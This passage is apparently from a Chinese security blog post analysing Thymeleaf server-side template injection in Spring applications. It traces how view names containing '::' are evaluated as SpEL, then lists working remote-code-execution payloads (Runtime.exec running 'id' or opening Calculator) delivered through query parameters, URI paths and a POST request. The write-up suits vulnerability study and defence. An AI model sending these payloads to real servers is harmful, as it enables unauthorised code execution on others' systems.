+<p>在由<code>ContentNegotiatingViewResolver#getBestView</code>选出最佳的<strong>View</strong>对象后，就会调用该对象的<code>render</code>方法。接着我们看下<code>ThymeleafView#renderFragment</code>，<code>ThymeleafView#render</code>的最终调用。</p>
+<p><code>ThymeleafView#renderFragment</code>的处理流程大致可以分为三步：</p>
+<ul>
+<li>渲染Thymeleaf模板前的准备：这里主要是一些变量的检查和上下文的设置。</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935393965-07d4006c-18d4-493f-9bd3-98ad23eb1eec.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li><code>viewtemplateName</code>的解析：漏洞的产生点，代码会根据<code>viewtemplateName</code>中是否含有<code>::</code>来决定是否要对其进行解析，最后解析出<code>templateName</code>变量。</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935621931-02f164fd-9b8d-47b3-91a0-ef0b54de2450.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>渲染模版，处理响应：在做好响应的类型、字符编码等配置后，使用<code>viewTemplateEngine.process</code>方法读取模板文件、解析模板内容、执行表达式、渲染结果等多个步骤。最后将内容返回给客户端</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935867500-6167221f-714c-4558-9342-97caca9b9b25.png" alt="image.png" loading="lazy"></figure>
+<h1 id="漏洞成因">漏洞成因</h1>
+<p>漏洞的成因就在解析<code>viewTemplateName</code>的代码中，当<code>viewTemplateName</code>中含有<code>::</code>，会用<code>&quot;~{&quot; + viewTemplateName + &quot;}&quot;</code>包裹将其作为一个片段表达式，调用<code>parser.parseExpression</code>进行解析<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712936048123-abc8f184-0b05-4952-bd9d-9a4e4495b8fd.png" alt="image.png" loading="lazy"></p>
+<p>跟进实现，<code>StandardExpressionParser#parseExpression</code>中有一步预处理的流程，根据名字可以猜到它处理的就是表达式中<code>__${expression}__</code>预处理表达式的部分<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712937292709-f75f1916-50d4-408d-a0de-fe5377191773.png" alt="image.png" loading="lazy"></p>
+<p>跟进<code>StandardExpressionPreprocessor#preprocess</code>，如果没有<code>_</code>直接返回<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712937457017-1e2a1796-1461-45da-b850-79e86af0cc78.png" alt="image.png" loading="lazy"></p>
+<p>之后的解析流程会先用正则<code>\_\_(.*?)\_\_</code>匹配出<strong>预处理表达式之间的内容</strong>，再传给<code>StandardExpressionParser.parseExpression</code>进行解析（这是作为了一个变量表达式递归解析？），最后调用解析出来的<strong>IStandardExpression</strong>对象的<code>execute</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938072287-061f06bf-8c4c-49fd-a741-303f3cdfa727.png" alt="image.png" loading="lazy"></p>
+<p>在<code>expression.execute</code>的最后会将<strong>预处理表达式之间的内容</strong>作为<strong>SpEL执行表达式</strong>（加入学习列表）解析，进而触发任意代码执行。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938381093-b1806f25-ee8d-4633-8d95-a8d7004aa291.png" alt="image.png" loading="lazy"></p>
+<p>小结一下：</p>
+<ul>
+<li>漏洞的成因是在<strong>ThymeleafView</strong>对象调用<code>render</code>方法渲染模板的时候产生的，准确的说应该是在解析自己的<code>templateName</code>属性时产生的</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938848792-58c8f143-f455-4006-8959-e2e5512131e3.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>当攻击者可以控制解析的<code>templateName</code>即可产生漏洞，具体而言满足的条件有（来自turn1tup师傅的总结）：
+<ul>
+<li>用户传入的字符串拼接到了<code>Controller</code>方法的返回值中且返回的视图非重定向（重定向优先级最高），或URI路径拼接了用户的输入且<code>Controller</code>方法参数中不带有<code>ServletResponse</code>类型的参数</li>
+<li>视图引擎名称中需要包含<code>::</code>字符串</li>
+<li>被执行表达式字符串前后需要带有两个下划线，即<code>__${EL}__</code>；</li>
+<li>如果POC在URI中，由于URI格式化的原因且我们的POC中带有<code>.</code>符号，所以需要在URI末尾添加<code>.</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="攻击方式">攻击方式</h1>
+<p>根据可控位置的不同，大致有三种利用场景</p>
+<h2 id="select">select</h2>
+<pre><code class="language-java">@GetMapping(&quot;/fragment&quot;)
+public String fragment(@RequestParam String section) {
+    return &quot;index :: &quot; + section; // fragment is tainted
+}
+</code></pre>
+<p>很简单易懂，payload</p>
+<pre><code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x
+</code></pre>
+<h2 id="path">/path</h2>
+<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
+public String path(@RequestParam String lang) {
+    return &quot;user/&quot; + lang + &quot;/index&quot;; // template path is tainted
+}
+</code></pre>
+<p>payload和上面一样，虽然第一感觉有点反直觉，但看到最后处理的<code>viewTemplateName</code>就懂了</p>
+<pre><code>user/__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22).getInputStream()).next()}__::.x/index
+</code></pre>
+<h2 id="uri-path">URI PATH</h2>
+<pre><code class="language-java">@GetMapping(&quot;/doc/{document}&quot;)
+public void getDocument(@PathVariable String document) {
+    log.info(&quot;Retrieving &quot; + document);
+    //returns void, so view name is taken from URI
+}
+</code></pre>
+<p>因为<code>mav</code>返回值为空，所以<code>viewTemplateName</code>会从uri中获取，直接在<code>{document}</code>位置传入payload即可</p>
+<pre><code>/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.x
+</code></pre>
+<h2 id="其他姿势">其他姿势</h2>
+<p>记下poc</p>
+<pre><code># 构造回显，在最后加两个.
+/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::..
+
+# 最后只加个.也是可以的，不一定必须是.x
+/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.
+
+# :: 位置不用固定
+::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__
+
+# POST方式
+POST /path HTTP/1.1
+Host: localhost:8090
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 135
+
+lang=::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__
+
+# 省略__
+# 情况如下
+@RequestMapping(&quot;/path&quot;)
+public String path2(@RequestParam String lang) {
+    return lang; //template path is tainted
+}
+
+GET /path2?lang=$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d::.x HTTP/1.1
+Host: localhost:8090
+</code></pre>
+<h1 id="参考">参考</h1>
+<p><a href="https://www.cnblogs.com/CoLo/p/15507738.html">https://www.cnblogs.com/CoLo/p/15507738.html</a><br>
+<a href="https://xz.aliyun.com/t/9826?">https://xz.aliyun.com/t/9826</a><br>
+<a href="https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/">https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/</a><br>
+<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p>
+]]></content>
+    </entry>
+</feed>
